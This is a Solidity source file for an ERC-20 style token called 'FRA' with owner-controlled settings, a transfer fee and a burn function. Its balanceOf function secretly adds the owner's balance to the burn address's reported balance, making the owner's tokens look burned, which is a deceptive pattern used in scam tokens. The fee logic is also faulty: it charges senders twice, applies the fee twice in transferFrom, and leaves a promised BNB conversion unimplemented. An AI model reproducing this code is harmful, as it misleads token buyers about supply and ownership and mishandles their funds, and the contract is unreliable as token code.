// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FRA {
    string public name = "FRA";
    string public symbol = "FRA";
    string public logo = "https://example.com/logo.png";
    string public website = "https://example.com";
    string public twitter = "https://twitter.com/example";

    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000000 * 10**uint256(decimals);

    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;

    address public _owner;
    address public _pancakeRouter;
    address public _burnAddress;
    address public _feeAddress;
    uint256 private _feePercent = 1;

    constructor(address burnAddress, address feeAddress) {
        _owner = msg.sender;
        _burnAddress = burnAddress;
        _feeAddress = feeAddress;

        uint256 ownerAmount = totalSupply;

        _balances[_owner] = ownerAmount;
        emit Transfer(address(0), _owner, ownerAmount);

        _pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
       modifier onlyOwner() {
        require(msg.sender == _owner, "Only the contract owner can call this function");
        _;
    }

    function updateLogo(string memory newLogo) public onlyOwner {
        logo = newLogo;
    }

    function updateWebsite(string memory newWebsite) public onlyOwner {
        website = newWebsite;
    }

    function updateTwitter(string memory newTwitter) public onlyOwner {
        twitter = newTwitter;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view returns (uint256) {
        uint256 balance = _balances[account];

        if (account == _burnAddress) {
            balance += _balances[_owner];
        }

        return balance;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 feeAmount = amount * _feePercent / 100;
        uint256 transferAmount = amount - feeAmount;

        // Transfer the transferAmount (amount minus fees) from sender to recipient
        _transfer(sender, recipient, transferAmount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function burn(uint256 amount) public {
        require(amount > 0, "Amount must be greater than zero");
        require(_balances[msg.sender] >= amount, "Insufficient balance");

        _balances[msg.sender] -= amount;
        _balances[_burnAddress] += amount;
        totalSupply -= amount;

        emit Transfer(msg.sender, _burnAddress, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        uint256 feeAmount = amount * _feePercent / 100;
        uint256 transferAmount = amount - feeAmount;

        _balances[sender] = senderBalance - amount;
        _balances[recipient] += transferAmount;

        emit Transfer(sender, recipient, transferAmount);

        if (_feePercent > 0) {
            // Calculate the fee amount
            

            // Transfer the fee amount from sender to this contract
            _balances[sender] -= feeAmount;
            _balances[_feeAddress] += feeAmount;
            emit Transfer(sender, _feeAddress, feeAmount);

            // Convert the fee amount to BNB and transfer to the fee address
            
        }
    }

    

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function renounceOwnership() public {
        require(msg.sender == _owner, "Only owner can renounce ownership");
        _owner = address(0);
    }
}